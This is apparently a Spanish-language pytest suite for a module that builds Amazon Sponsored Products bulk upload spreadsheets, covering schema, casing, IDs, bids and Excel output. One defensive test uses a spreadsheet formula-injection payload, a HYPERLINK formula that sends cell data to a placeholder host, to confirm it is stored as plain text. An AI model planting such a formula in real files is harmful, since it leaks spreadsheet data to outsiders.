"""Tests de core/bulk/export.py — los cuatro constructores de bulks SP.

El módulo es código puro (sin Streamlit, sin I/O de disco salvo el Excel en
memoria), así que se testea tal cual está.

Qué cambió respecto de la suite anterior: `build_amazon_bulk` dejó de existir.
Producía Entity 'Negative keyword' con k minúscula, Match Type en camelCase y
el NOMBRE de la campaña en la columna Campaign ID — tres cosas que Amazon
rechaza, y con rollback total (INV-5.4) eso significa el archivo entero. En su
lugar hay cuatro constructores con firmas incompatibles entre sí, uno por cada
fila de la tabla de INV-5.2.

La sección de caracterización desapareció con él: congelaba el comportamiento
de una función que producía archivos inválidos. Lo único que sobrevive de esa
sección son los tests de `aggregate_str_with_top_campaign`, que no se tocó.

Datos sintéticos inline. Los IDs tienen la forma de los reales (~15 dígitos)
pero no corresponden a ninguna cuenta.

Contrato: `.claude/skills/ppc-business-invariants.md` — INV-5.
"""

from __future__ import annotations

import io
import zipfile

import openpyxl
import pandas as pd
import pytest

from core.bulk.export import (
    _BULK_COLS,
    _BULK_SHEET_NAME,
    _METADATA_SHEET_NAME,
    _coerce_str,
    aggregate_str_with_top_campaign,
    build_adgroup_negative,
    build_bid_update,
    build_campaign_negative,
    build_keyword_create,
    write_bulk_excel,
)
from core.bulk.keyword_text import NEGATIVE_KEYWORD_TEXT_LIMITS, negative_keyword_text_problem
from core.bulk.parser import validate_bulk


# ---------------------------------------------------------------------
# Helpers de datos
# ---------------------------------------------------------------------

CAMPAIGN_ID = "132313349237695"
AD_GROUP_ID = "271884452900011"
KEYWORD_ID = "375512123676480"


def _cneg(**kw) -> dict:
    """Row válida para build_campaign_negative."""
    base = {
        "campaign_id": CAMPAIGN_ID,
        "keyword_text": "zapatos rojos",
        "match_type": "Negative Exact",
    }
    base.update(kw)
    return base


def _agneg(**kw) -> dict:
    """Row válida para build_adgroup_negative."""
    base = {
        "campaign_id": CAMPAIGN_ID,
        "ad_group_id": AD_GROUP_ID,
        "keyword_text": "zapatos rojos",
        "match_type": "Negative Phrase",
    }
    base.update(kw)
    return base


def _kw(**kw) -> dict:
    """Row válida para build_keyword_create."""
    base = {
        "campaign_id": CAMPAIGN_ID,
        "ad_group_id": AD_GROUP_ID,
        "keyword_text": "botas negras",
        "match_type": "Exact",
        "bid": 1.25,
    }
    base.update(kw)
    return base


def _upd(**kw) -> dict:
    """Row válida para build_bid_update."""
    base = {
        "campaign_id": CAMPAIGN_ID,
        "ad_group_id": AD_GROUP_ID,
        "keyword_id": KEYWORD_ID,
        "keyword_text": "botas negras",
        "match_type": "Exact",
        "bid": 0.90,
    }
    base.update(kw)
    return base


_CONSTRUCTORES = [
    (build_campaign_negative, _cneg, "Campaign Negative Keyword", "Create"),
    (build_adgroup_negative, _agneg, "Negative Keyword", "Create"),
    (build_keyword_create, _kw, "Keyword", "Create"),
    (build_bid_update, _upd, "Keyword", "Update"),
]

_IDS_CONSTRUCTORES = [
    "campaign_negative",
    "adgroup_negative",
    "keyword_create",
    "bid_update",
]


def _sheets(xlsx_bytes: bytes) -> list[str]:
    return pd.ExcelFile(io.BytesIO(xlsx_bytes)).sheet_names


# ---------------------------------------------------------------------
# Schema — las 26 columnas del template validado (INV-5.5)
# ---------------------------------------------------------------------

def test_bulk_cols_son_las_26_del_template():
    assert len(_BULK_COLS) == 26
    assert _BULK_COLS[:4] == ["Product", "Entity", "Operation", "Campaign ID"]
    assert _BULK_COLS[-1] == "Sites"
    assert "Keyword ID" in _BULK_COLS, "sin Keyword ID un update de bid es inexpresable"


@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_bulk_df_tiene_las_26_columnas_en_orden(constructor, row, entity, operation):
    bulk_df, _ = constructor([row()])
    assert list(bulk_df.columns) == _BULK_COLS


@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_invalid_df_tiene_las_26_columnas_mas_el_motivo(
    constructor, row, entity, operation
):
    _, invalid_df = constructor([row(keyword_text="")])
    assert list(invalid_df.columns) == _BULK_COLS + ["_invalid_reason"]
    assert len(invalid_df) == 1


# ---------------------------------------------------------------------
# Valores canónicos — casing exacto (INV-5.3)
# ---------------------------------------------------------------------

@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_entity_y_operation_con_casing_canonico(constructor, row, entity, operation):
    bulk_df, _ = constructor([row()])
    fila = bulk_df.iloc[0]
    assert fila["Entity"] == entity
    assert fila["Operation"] == operation
    assert fila["Product"] == "Sponsored Products"
    assert fila["State"] == "enabled"


@pytest.mark.parametrize("match_type", ["Negative Exact", "Negative Phrase"])
def test_negativos_aceptan_los_dos_match_types_title_case(match_type):
    bulk_df, invalid_df = build_campaign_negative([_cneg(match_type=match_type)])
    assert len(bulk_df) == 1
    assert invalid_df.empty
    assert bulk_df.iloc[0]["Match Type"] == match_type


@pytest.mark.parametrize("match_type", ["Exact", "Phrase", "Broad"])
def test_keywords_aceptan_los_tres_match_types_title_case(match_type):
    bulk_df, invalid_df = build_keyword_create([_kw(match_type=match_type)])
    assert len(bulk_df) == 1
    assert invalid_df.empty


@pytest.mark.parametrize("match_type", ["negativeExact", "negativePhrase", "campaignNegativeExact"])
def test_camelcase_en_negativos_es_invalido(match_type):
    """Los camelCase no tienen validación empírica; el Title Case sí."""
    bulk_df, invalid_df = build_campaign_negative([_cneg(match_type=match_type)])
    assert bulk_df.empty
    assert "Match Type" in invalid_df.iloc[0]["_invalid_reason"]


@pytest.mark.parametrize("match_type", ["exact", "phrase", "broad"])
def test_camelcase_en_keywords_es_invalido(match_type):
    bulk_df, invalid_df = build_keyword_create([_kw(match_type=match_type)])
    assert bulk_df.empty
    assert "Title Case" in invalid_df.iloc[0]["_invalid_reason"]


def test_match_type_positivo_en_negativo_es_invalido():
    bulk_df, invalid_df = build_adgroup_negative([_agneg(match_type="Exact")])
    assert bulk_df.empty
    assert len(invalid_df) == 1


def test_match_type_negativo_en_keyword_es_invalido():
    bulk_df, invalid_df = build_keyword_create([_kw(match_type="Negative Exact")])
    assert bulk_df.empty
    assert len(invalid_df) == 1


# ---------------------------------------------------------------------
# Campos obligatorios por Entity (INV-5.2)
# ---------------------------------------------------------------------

def test_campaign_negative_deja_ad_group_id_vacio():
    bulk_df, _ = build_campaign_negative([_cneg()])
    assert bulk_df.iloc[0]["Ad Group ID"] == ""
    assert bulk_df.iloc[0]["Campaign ID"] == CAMPAIGN_ID


def test_campaign_negative_con_ad_group_id_es_error_de_nivel():
    """El negativo a nivel campaña no pertenece a ningún ad group."""
    bulk_df, invalid_df = build_campaign_negative([_cneg(ad_group_id=AD_GROUP_ID)])
    assert bulk_df.empty
    motivo = invalid_df.iloc[0]["_invalid_reason"]
    assert "Ad Group ID" in motivo
    assert "build_adgroup_negative" in motivo, "el motivo dice qué constructor usar"


def test_adgroup_negative_lleva_los_dos_ids():
    bulk_df, _ = build_adgroup_negative([_agneg()])
    fila = bulk_df.iloc[0]
    assert fila["Campaign ID"] == CAMPAIGN_ID
    assert fila["Ad Group ID"] == AD_GROUP_ID


def test_adgroup_negative_sin_ad_group_id_es_invalido():
    bulk_df, invalid_df = build_adgroup_negative([_agneg(ad_group_id="")])
    assert bulk_df.empty
    assert "Missing Parent ID" in invalid_df.iloc[0]["_invalid_reason"]


def test_bid_update_sin_keyword_id_es_invalido():
    """Sin Keyword ID Amazon no sabe qué keyword modificar."""
    bulk_df, invalid_df = build_bid_update([_upd(keyword_id="")])
    assert bulk_df.empty
    assert "keyword_id" in invalid_df.iloc[0]["_invalid_reason"]


def test_bid_update_escribe_el_keyword_id():
    bulk_df, _ = build_bid_update([_upd()])
    assert bulk_df.iloc[0]["Keyword ID"] == KEYWORD_ID


def test_keyword_create_deja_keyword_id_vacio():
    bulk_df, _ = build_keyword_create([_kw()])
    assert bulk_df.iloc[0]["Keyword ID"] == ""


def test_keyword_create_con_keyword_id_es_invalido():
    bulk_df, invalid_df = build_keyword_create([_kw(keyword_id=KEYWORD_ID)])
    assert bulk_df.empty
    assert "Keyword ID" in invalid_df.iloc[0]["_invalid_reason"]


@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_sin_campaign_id_la_fila_es_invalida(constructor, row, entity, operation):
    bulk_df, invalid_df = constructor([row(campaign_id="")])
    assert bulk_df.empty
    assert "campaign_id" in invalid_df.iloc[0]["_invalid_reason"]


@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_sin_keyword_text_la_fila_es_invalida(constructor, row, entity, operation):
    bulk_df, invalid_df = constructor([row(keyword_text="")])
    assert bulk_df.empty
    assert "Keyword Text" in invalid_df.iloc[0]["_invalid_reason"]


# ---------------------------------------------------------------------
# Bid
# ---------------------------------------------------------------------

def test_campaign_negative_no_lleva_bid():
    """Amazon rechaza un negativo que traiga bid: no puja por nada."""
    bulk_df, _ = build_campaign_negative([_cneg()])
    assert bulk_df.iloc[0]["Bid"] == ""


def test_adgroup_negative_no_lleva_bid():
    bulk_df, _ = build_adgroup_negative([_agneg()])
    assert bulk_df.iloc[0]["Bid"] == ""


def test_bid_pasado_a_un_negativo_se_ignora_no_se_escribe():
    """El constructor fuerza Bid vacío aunque el caller mande uno."""
    bulk_df, invalid_df = build_adgroup_negative([_agneg(bid=0.75)])
    assert len(bulk_df) == 1
    assert bulk_df.iloc[0]["Bid"] == ""
    assert invalid_df.empty


@pytest.mark.parametrize("constructor, row", [
    (build_keyword_create, _kw),
    (build_bid_update, _upd),
])
@pytest.mark.parametrize("bid_malo", ["abc", "$1.20", "1,25"])
def test_bid_no_convertible_marca_la_fila_invalida(constructor, row, bid_malo):
    """CAMBIO DE COMPORTAMIENTO respecto del test de caracterización B1 viejo.

    Antes `_coerce_bid` convertía la basura en "" y la fila entraba igual al
    bulk. Amazon rechazaba el archivo entero y el AM no tenía cómo saber cuál
    fila lo había roto. Ahora la fila no entra y el motivo lo dice.
    """
    bulk_df, invalid_df = constructor([row(bid=bid_malo)])
    assert bulk_df.empty
    assert "Bid" in invalid_df.iloc[0]["_invalid_reason"]


@pytest.mark.parametrize("bid_malo", ["", None, 0, -1.5])
def test_bid_vacio_o_no_positivo_marca_la_fila_invalida(bid_malo):
    bulk_df, invalid_df = build_keyword_create([_kw(bid=bid_malo)])
    assert bulk_df.empty
    assert len(invalid_df) == 1


def test_bid_valido_se_redondea_a_dos_decimales():
    bulk_df, _ = build_keyword_create([_kw(bid="1.2349")])
    assert bulk_df.iloc[0]["Bid"] == 1.23


# ---------------------------------------------------------------------
# Formato de los IDs — nunca float, nunca notación científica
# ---------------------------------------------------------------------

def test_id_float_con_cola_decimal_se_normaliza_a_string():
    """375512123676480.0 es el mismo número mal renderizado: se repara."""
    bulk_df, invalid_df = build_bid_update([_upd(keyword_id="375512123676480.0")])
    assert invalid_df.empty
    valor = bulk_df.iloc[0]["Keyword ID"]
    assert valor == KEYWORD_ID
    assert isinstance(valor, str)
    assert "." not in valor


def test_id_pasado_como_float_python_sale_como_string_sin_punto():
    bulk_df, _ = build_campaign_negative([_cneg(campaign_id=132313349237695.0)])
    valor = bulk_df.iloc[0]["Campaign ID"]
    assert valor == CAMPAIGN_ID
    assert isinstance(valor, str)


def test_id_en_notacion_cientifica_es_invalido_no_se_repara():
    """float('4.42e+14') da 442000000000000: un ID plausible y equivocado.

    Los dígitos ya se perdieron en el origen. Repararlo sería inventar un ID,
    así que la fila se marca inválida.
    """
    bulk_df, invalid_df = build_campaign_negative([_cneg(campaign_id="4.42e+14")])
    assert bulk_df.empty
    motivo = invalid_df.iloc[0]["_invalid_reason"]
    assert "cientifica" in motivo


def test_alias_no_numerico_es_valido_en_keyword_create():
    """INV-5.1 modo ALIAS: string arbitrario que linkea filas del mismo archivo."""
    bulk_df, invalid_df = build_keyword_create([
        _kw(campaign_id="SU-AGE-HARVEST-001", ad_group_id="SU-AGE-HARVEST-001-AG")
    ])
    assert invalid_df.empty
    assert bulk_df.iloc[0]["Campaign ID"] == "SU-AGE-HARVEST-001"


def test_nombres_opcionales_se_copian_a_las_columnas_informativas():
    bulk_df, _ = build_adgroup_negative([
        _agneg(campaign_name="LTD - SP - Auto", ad_group_name="AG Principal")
    ])
    fila = bulk_df.iloc[0]
    assert fila["Campaign Name"] == "LTD - SP - Auto"
    assert fila["Ad Group Name"] == "AG Principal"


def test_sin_nombres_las_columnas_informativas_quedan_vacias():
    bulk_df, _ = build_adgroup_negative([_agneg()])
    assert bulk_df.iloc[0]["Campaign Name"] == ""


# ---------------------------------------------------------------------
# Segunda llave — la salida pasa por validate_bulk
# ---------------------------------------------------------------------

@pytest.mark.parametrize(
    "constructor, row, entity, operation", _CONSTRUCTORES, ids=_IDS_CONSTRUCTORES
)
def test_la_salida_pasa_validate_bulk_sin_errores(constructor, row, entity, operation):
    bulk_df, _ = constructor([row()])
    errores = [e for e in validate_bulk(bulk_df) if e.severidad == "error"]
    assert errores == [], [e.mensaje for e in errores]


def test_filas_validas_e_invalidas_se_reparten_sin_perder_ninguna():
    bulk_df, invalid_df = build_keyword_create([
        _kw(keyword_text="botas negras"),
        _kw(keyword_text="", bid=1.0),
        _kw(keyword_text="mocasines", bid="abc"),
        _kw(keyword_text="sandalias"),
    ])
    assert len(bulk_df) == 2
    assert len(invalid_df) == 2
    assert len(bulk_df) + len(invalid_df) == 4


def test_lista_vacia_devuelve_dos_dataframes_vacios_con_schema():
    bulk_df, invalid_df = build_campaign_negative([])
    assert bulk_df.empty
    assert invalid_df.empty
    assert list(bulk_df.columns) == _BULK_COLS


def test_acepta_dataframe_ademas_de_lista_de_dicts():
    bulk_df, _ = build_campaign_negative(pd.DataFrame([_cneg(), _cneg(keyword_text="otro")]))
    assert len(bulk_df) == 2


# ---------------------------------------------------------------------
# Los tres bulks que Amazon aceptó en la validación empírica del 2026-08-26
# ---------------------------------------------------------------------

def test_reproduce_los_bulks_que_amazon_acepto():
    """Los tres archivos con Success confirmado, rearmados con la API nueva.

    Fuentes (INV-5): F0-1_negativos (4/4), F0-2_fix_bid (1/1),
    F2-1_campana_nueva (6/6). Del tercero se cubre la porción de keywords:
    las filas Campaign / Ad Group / Product Ad todavía no tienen constructor,
    y por eso el alias es lo único que las ata a este archivo.
    """
    # F0-1 — negativos sobre campañas que ya existen, modo REFERENCIA.
    negativos, inv_neg = build_campaign_negative([
        _cneg(keyword_text=termino)
        for termino in ("zapatos usados", "zapatos gratis", "zapato roto", "zapatilla")
    ])
    assert len(negativos) == 4
    assert inv_neg.empty

    # F0-2 — update de bid, requiere Keyword ID.
    fix_bid, inv_bid = build_bid_update([_upd(bid=0.55)])
    assert len(fix_bid) == 1
    assert inv_bid.empty

    # F2-1 — campaña nueva: las keywords se atan por alias, no por ID numérico.
    alias = "SU-AGE-HARVEST-001"
    nuevas, inv_nuevas = build_keyword_create([
        _kw(campaign_id=alias, ad_group_id=f"{alias}-AG", keyword_text=kw, bid=0.80)
        for kw in ("botas de cuero", "botas negras mujer", "botines")
    ])
    assert len(nuevas) == 3
    assert inv_nuevas.empty

    for bulk in (negativos, fix_bid, nuevas):
        errores = [e for e in validate_bulk(bulk) if e.severidad == "error"]
        assert errores == [], [e.mensaje for e in errores]


# ---------------------------------------------------------------------
# write_bulk_excel — sin cambios de firma
# ---------------------------------------------------------------------

def test_write_bulk_excel_devuelve_bytes_releibles():
    bulk_df, _ = build_campaign_negative([_cneg()])
    xlsx = write_bulk_excel(bulk_df)

    assert isinstance(xlsx, bytes) and len(xlsx) > 0
    releido = pd.read_excel(io.BytesIO(xlsx), sheet_name=_BULK_SHEET_NAME)
    assert list(releido.columns) == _BULK_COLS
    assert len(releido) == 1


def test_write_bulk_excel_una_o_dos_hojas_segun_metadata():
    bulk_df, _ = build_campaign_negative([_cneg()])
    metadata_df = pd.DataFrame({"Search Term": ["zapatos rojos"], "Regla": ["R2"]})

    assert _sheets(write_bulk_excel(bulk_df, None)) == [_BULK_SHEET_NAME]
    assert _sheets(write_bulk_excel(bulk_df, metadata_df)) == [
        _BULK_SHEET_NAME,
        _METADATA_SHEET_NAME,
    ]


def test_write_bulk_excel_preserva_el_id_como_texto():
    """El ID no puede volver del Excel como 1.32313e+14."""
    bulk_df, _ = build_campaign_negative([_cneg()])
    xlsx = write_bulk_excel(bulk_df)
    releido = pd.read_excel(
        io.BytesIO(xlsx), sheet_name=_BULK_SHEET_NAME, dtype={"Campaign ID": str}
    )
    assert releido.iloc[0]["Campaign ID"] == CAMPAIGN_ID


def test_write_bulk_excel_stores_formula_like_text_as_plain_text():
    formula_term = '=HYPERLINK("http://example.invalid/?d="&B2,"click")'
    bulk_df = pd.DataFrame([{column: "" for column in _BULK_COLS} | {"Keyword Text": formula_term,
                                                                     "Campaign Name": "=1+1"}])
    metadata_df = pd.DataFrame({"Search Term": [formula_term], "Regla": ["R2"]})

    xlsx = write_bulk_excel(bulk_df, metadata_df)

    workbook = openpyxl.load_workbook(io.BytesIO(xlsx))
    cells = [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]
    assert [cell.coordinate for cell in cells if cell.data_type == "f"] == []
    keyword_column = _BULK_COLS.index("Keyword Text") + 1
    assert workbook[_BULK_SHEET_NAME].cell(row=2, column=keyword_column).value == formula_term
    assert workbook[_METADATA_SHEET_NAME]["A2"].value == formula_term
    for sheet_xml in ("xl/worksheets/sheet1.xml", "xl/worksheets/sheet2.xml"):
        assert "<f>" not in zipfile.ZipFile(io.BytesIO(xlsx)).read(sheet_xml).decode("utf-8")


@pytest.mark.parametrize("keyword_text, match_type, fragment", [
    ("x" * 81, "Negative Exact", "81 caracteres"),
    ("warm sleeping bag for toddler", "Negative Phrase", "5 palabras"),
    ("one two three four five six seven eight nine ten eleven", "Negative Exact", "11 palabras"),
    ("100% cotton", "Negative Exact", "«%»"),
    ("tog 1/2", "Negative Phrase", "«/»"),
    ("safe?", "Negative Exact", "«?»"),
    ("a`b", "Negative Exact", "«`»"),
    ("a\\b", "Negative Exact", "«\\»"),
    ("=sum(a1)", "Negative Exact", "«=»"),
])
def test_negative_keyword_text_problem_names_what_amazon_rejects(keyword_text, match_type, fragment):
    assert fragment in negative_keyword_text_problem(keyword_text, match_type)


@pytest.mark.parametrize("keyword_text, match_type", [
    ("x" * 80, "Negative Exact"),
    ("warm sleeping bag toddler", "Negative Phrase"),
    ("one two three four five six seven eight nine ten", "Negative Exact"),
    ("mac & cheese", "Negative Phrase"),
    ("zapatos-rojos 2.5 tog", "Negative Exact"),
])
def test_negative_keyword_text_problem_accepts_text_within_the_limits(keyword_text, match_type):
    assert negative_keyword_text_problem(keyword_text, match_type) is None


def test_negative_keyword_limits_are_one_shared_constant():
    assert NEGATIVE_KEYWORD_TEXT_LIMITS.max_characters == 80
    assert dict(NEGATIVE_KEYWORD_TEXT_LIMITS.max_words_by_match_type) == {"Negative Phrase": 4, "Negative Exact": 10}


@pytest.mark.parametrize("constructor, row", [(build_adgroup_negative, _agneg), (build_campaign_negative, _cneg)],
                         ids=["adgroup_negative", "campaign_negative"])
def test_negative_builders_move_keyword_text_amazon_rejects_to_invalid(constructor, row):
    bulk_df, invalid_df = constructor([row(keyword_text="100% algodon"), row(keyword_text="algodon organico")])

    assert list(bulk_df["Keyword Text"]) == ["algodon organico"]
    assert len(invalid_df) == 1
    assert "«%»" in invalid_df.iloc[0]["_invalid_reason"]


# ---------------------------------------------------------------------
# Helpers que sobreviven del módulo anterior
# ---------------------------------------------------------------------

def test_coerce_str_normaliza_nan_none_y_espacios():
    assert _coerce_str(None) == ""
    assert _coerce_str(float("nan")) == ""
    assert _coerce_str("nan") == ""
    assert _coerce_str("NaN") == ""
    assert _coerce_str("  Camp X  ") == "Camp X"


def test_aggregate_hereda_campaign_del_mayor_spend():
    """Ante un término en N campañas gana la de MAYOR SPEND (idxmax), y
    "_n_campaigns" queda como flag de ambigüedad para el AM.

    La decisión de bid va contra el contexto que más pesa económicamente.
    El spend de salida es el SUM del grupo, no el del row top.
    """
    df_str = pd.DataFrame({
        "Customer Search Term": ["kw a", "kw a", "kw b"],
        "Spend": [10.0, 40.0, 5.0],
        "Campaign Name": ["Camp-Low", "Camp-High", "Camp-Solo"],
        "Ad Group": ["AG-Low", "AG-High", "AG-Solo"],
        "_orders": [1, 3, 2],
    })

    out = aggregate_str_with_top_campaign(
        df_str,
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
        ad_group_col="Ad Group",
        extra_agg={"_orders": "sum"},
    )
    fila_a = out[out["Customer Search Term"] == "kw a"].iloc[0]
    fila_b = out[out["Customer Search Term"] == "kw b"].iloc[0]

    assert fila_a["Campaign Name"] == "Camp-High"   # gana la de $40, no la de $10
    assert fila_a["Ad Group"] == "AG-High"
    assert fila_a["Spend"] == 50.0                  # SUM del grupo
    assert fila_a["_orders"] == 4
    assert fila_a["_n_campaigns"] == 2              # ambiguo: el AM debe revisar
    assert fila_b["_n_campaigns"] == 1


@pytest.mark.parametrize(
    "term_col, spend_col, esperado",
    [
        ("NO EXISTE", "Spend", "term_col"),
        ("Customer Search Term", "NO EXISTE", "spend_col"),
    ],
)
def test_aggregate_valida_columnas_requeridas(term_col, spend_col, esperado):
    """term_col y spend_col se validan con ValueError explícito: falla ruidoso
    en vez de KeyError opaco de pandas adentro del groupby.

    Nótese la asimetría — campaign_col/ad_group_col NO se validan: si no
    existen se ignoran en silencio y el bulk sale sin Campaign Name.
    """
    df_str = pd.DataFrame({
        "Customer Search Term": ["kw a"],
        "Spend": [10.0],
        "Campaign Name": ["Camp-Solo"],
    })

    with pytest.raises(ValueError, match=esperado):
        aggregate_str_with_top_campaign(
            df_str,
            term_col=term_col,
            spend_col=spend_col,
            campaign_col="Campaign Name",
        )


# ---------------------------------------------------------------------
# aggregate_str_with_top_campaign — extra_inherit
# ---------------------------------------------------------------------

def _df_str_dos_campanas() -> pd.DataFrame:
    """Un término en dos campañas: la de $40 gana el idxmax, la de $10 pierde."""
    return pd.DataFrame({
        "Customer Search Term": ["kw a", "kw a", "kw b"],
        "Spend": [10.0, 40.0, 5.0],
        "Campaign Name": ["Camp-Low", "Camp-High", "Camp-Solo"],
        "Campaign ID": ["111111111111111", CAMPAIGN_ID, "333333333333333"],
        "Ad Group ID": ["444444444444444", AD_GROUP_ID, "666666666666666"],
        "Keyword ID": ["777777777777777", KEYWORD_ID, "999999999999999"],
    })


def test_extra_inherit_hereda_del_row_de_mayor_spend():
    """Los IDs salen del MISMO row que la campaña: la de $40, no la de $10."""
    out = aggregate_str_with_top_campaign(
        _df_str_dos_campanas(),
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
        extra_inherit=["Campaign ID", "Ad Group ID", "Keyword ID"],
    )
    fila = out[out["Customer Search Term"] == "kw a"].iloc[0]

    assert fila["Campaign Name"] == "Camp-High"
    assert fila["Campaign ID"] == CAMPAIGN_ID
    assert fila["Ad Group ID"] == AD_GROUP_ID
    assert fila["Keyword ID"] == KEYWORD_ID
    assert fila["_n_campaigns"] == 2, "sigue avisando que el término es ambiguo"


def test_extra_inherit_con_columna_inexistente_no_rompe():
    """El caller arma la lista sin saber qué trae el archivo del AM."""
    out = aggregate_str_with_top_campaign(
        _df_str_dos_campanas(),
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
        extra_inherit=["Campaign ID", "NO EXISTE", "Portfolio Name"],
    )
    assert "Campaign ID" in out.columns
    assert "NO EXISTE" not in out.columns
    assert "Portfolio Name" not in out.columns
    assert len(out) == 2


def test_extra_inherit_none_se_comporta_como_antes():
    """El default no cambia nada para los callers que ya existían."""
    df_str = _df_str_dos_campanas()
    kwargs = dict(
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
    )
    sin_param = aggregate_str_with_top_campaign(df_str, **kwargs)
    con_none = aggregate_str_with_top_campaign(df_str, extra_inherit=None, **kwargs)

    pd.testing.assert_frame_equal(sin_param, con_none)
    assert "Campaign ID" not in sin_param.columns


def test_extra_inherit_ignora_columna_ya_heredada():
    """Pasar campaign_col otra vez en extra_inherit no duplica la columna."""
    out = aggregate_str_with_top_campaign(
        _df_str_dos_campanas(),
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
        extra_inherit=["Campaign Name", "Campaign ID"],
    )
    assert list(out.columns).count("Campaign Name") == 1


def test_extra_inherit_lista_vacia_no_rompe():
    out = aggregate_str_with_top_campaign(
        _df_str_dos_campanas(),
        term_col="Customer Search Term",
        spend_col="Spend",
        campaign_col="Campaign Name",
        extra_inherit=[],
    )
    assert len(out) == 2
